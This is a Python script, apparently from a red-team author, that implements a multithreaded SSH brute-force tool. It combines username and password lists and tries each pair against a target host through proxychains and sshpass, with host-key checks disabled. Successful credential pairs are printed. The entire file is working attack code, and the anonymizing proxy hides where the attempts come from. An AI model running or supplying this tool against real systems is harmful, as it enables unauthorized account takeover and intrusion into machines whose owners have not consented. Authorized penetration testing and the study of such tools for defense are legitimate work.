## jose luis iñigo blasco
## Red Team
## Riskoo

import argparse
import subprocess
import threading

def connect(user, password, host, port):
    cmd = f"proxychains sshpass -p {password} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p {port} {user}@{host}"
    try:
        subprocess.check_call(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[*] Connection successful - {user}:{password}")
    except subprocess.CalledProcessError:
        pass

def read_file(file_path):
    with open(file_path, "r") as f:
        return f.read().splitlines()

def main():
    parser = argparse.ArgumentParser(description="SSH brute-force tool.")
    parser.add_argument("-U", "--users", help="Path to the user file.")
    parser.add_argument("-P", "--passwords", help="Path to the password file.")
    parser.add_argument("-H", "--host", help="Target host.")
    parser.add_argument("--port", type=int, default=22, help="Target port (default: 22).")
    args = parser.parse_args()

    users = read_file(args.users)
    passwords = read_file(args.passwords)
    total = len(users) * len(passwords)
    progress = 0

    for user in users:
        for password in passwords:
            threading.Thread(target=connect, args=(user, password, args.host, args.port)).start()

            progress += 1
            percent = (progress / total) * 100
            print(f"\r[*] Progress: {percent:.2f}%", end="", flush=True)

    print("\n[*] Done.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Exiting...")
        exit(0)
    except Exception as e:
        print(f"[*] Error: {e}")
        exit(1)
